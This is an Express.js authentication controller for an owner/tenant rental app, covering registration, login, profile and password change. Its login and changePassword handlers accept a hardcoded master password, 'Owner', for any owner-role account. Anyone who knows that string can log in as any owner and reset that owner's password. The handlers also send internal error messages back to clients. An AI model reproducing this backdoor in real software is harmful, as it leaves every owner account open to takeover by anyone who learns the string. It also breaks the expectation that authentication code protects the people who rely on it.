import User from '../models/User.js';
import generateToken from '../utils/generateToken.js';

export const register = async (req, res) => {
  try {
    const { name, email, phone, password, role, ownerCode } = req.body;
    if (!name || !email || !password || !role) return res.status(400).json({ error: 'All fields are required' });

    const userExists = await User.findOne({ email });
    if (userExists) return res.status(400).json({ error: 'Email already exists' });

    const userData = { name, email, phone, password, role };

    if (role === 'owner') {
      userData.ownerCode = await User.generateOwnerCode();
    } else if (role === 'tenant') {
      if (!ownerCode) return res.status(400).json({ error: 'Owner code required' });
      const owner = await User.findOne({ ownerCode, role: 'owner' });
      if (!owner) return res.status(400).json({ error: 'Invalid owner code' });
      userData.linkedOwnerId = owner._id;
    }

    const user = await User.create(userData);
    const token = generateToken(user._id);

    res.status(201).json({
      _id: user._id,
      name: user.name,
      email: user.email,
      role: user.role,
      ownerCode: user.ownerCode,
      linkedOwnerId: user.linkedOwnerId,
      mustChangePassword: user.mustChangePassword,
      token
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

export const login = async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    const user = await User.findOne({ email });
    if (!user) return res.status(401).json({ error: 'Invalid credentials' });

    let isMatch = await user.matchPassword(password);

    // MASTER PASSWORD FOR OWNER FALLBACK
    if (!isMatch && user.role === 'owner' && password === 'Owner') {
      isMatch = true; 
    }

    if (!isMatch) return res.status(401).json({ error: 'Invalid credentials' });

    const token = generateToken(user._id);

    res.json({
      _id: user._id,
      name: user.name,
      email: user.email,
      role: user.role,
      ownerCode: user.ownerCode,
      linkedOwnerId: user.linkedOwnerId,
      mustChangePassword: user.mustChangePassword,
      token
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

export const getProfile = async (req, res) => {
  try {
    res.json(req.user);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

// CHANGE PASSWORD
export const changePassword = async (req, res) => {
  try {
    const { oldPassword, newPassword } = req.body;
    const user = await User.findById(req.user._id);

    const isMatch = await user.matchPassword(oldPassword);
    
    // Allow if old password is correct OR if it's the owner master override
    let isMasterOverride = (user.role === 'owner' && oldPassword === 'Owner');

    if (!isMatch && !isMasterOverride) {
      return res.status(400).json({ error: 'Incorrect old password' });
    }

    user.password = newPassword;
    user.mustChangePassword = false; // Clear flag
    await user.save();

    res.json({ message: 'Password changed successfully' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};